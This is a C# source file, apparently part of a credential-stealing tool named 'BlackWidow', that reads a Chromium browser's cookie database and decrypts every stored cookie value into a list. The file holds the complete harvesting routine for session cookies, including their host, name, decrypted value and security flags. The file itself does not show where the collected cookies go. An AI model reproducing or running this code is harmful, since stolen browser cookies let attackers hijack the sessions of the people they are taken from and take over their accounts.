using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using BlackWidow.Browser;
using BlackWidow.Module;

namespace BlackWidow.Cookie
{
    class ChromiumCookieBase
    {
        public static List<CookieChromium> GetCookie(string dataPath)
        {
            string application = GetApplication.BrowserName(dataPath);
            List<CookieChromium> list = new List<CookieChromium>();
            SQLiteHandler sqliteHandler = null;
            if (!File.Exists(dataPath))
            {
                return list;
            }
            try
            {
                sqliteHandler = new SQLiteHandler(dataPath);
            }
            catch (Exception)
            {
                return list;
            }
            if (!sqliteHandler.ReadTable("cookies"))
            {
                return list;
            }
            int rowCount = sqliteHandler.GetRowCount();
            for (int i = 0; i < rowCount; i++)
            {
                try
                {
                    string value = sqliteHandler.GetValue(i, "host_key");
                    string value2 = sqliteHandler.GetValue(i, "name");
                    string value3 = ChromeDecrypt.Decrypt(sqliteHandler.GetValue(i, "encrypted_value"));
                    string value4 = sqliteHandler.GetValue(i, "path");
                    string value5 = sqliteHandler.GetValue(i, "expires_utc");
                    string value6 = sqliteHandler.GetValue(i, "last_access_utc");
                    bool secure = sqliteHandler.GetValue(i, "secure") == "1";
                    bool httpOnly = sqliteHandler.GetValue(i, "httponly") == "1";
                    bool expired = sqliteHandler.GetValue(i, "has_expired") == "1";
                    bool persistent = sqliteHandler.GetValue(i, "persistent") == "1";
                    bool priority = sqliteHandler.GetValue(i, "priority") == "1";
                    if (!string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3))
                    {
                        list.Add(new CookieChromium
                        {
                            HostKey = value,
                            Name = value2,
                            Value = value3,
                            Path = value4,
                            ExpiresUTC = value5,
                            LastAccessUTC = value6,
                            Secure = secure,
                            HttpOnly = httpOnly,
                            Expired = expired,
                            Persistent = persistent,
                            Priority = priority,
                            Browser = application
                        });
                    }
                }
                catch (Exception)
                {
                }
            }
            return list;
        }
    }
}
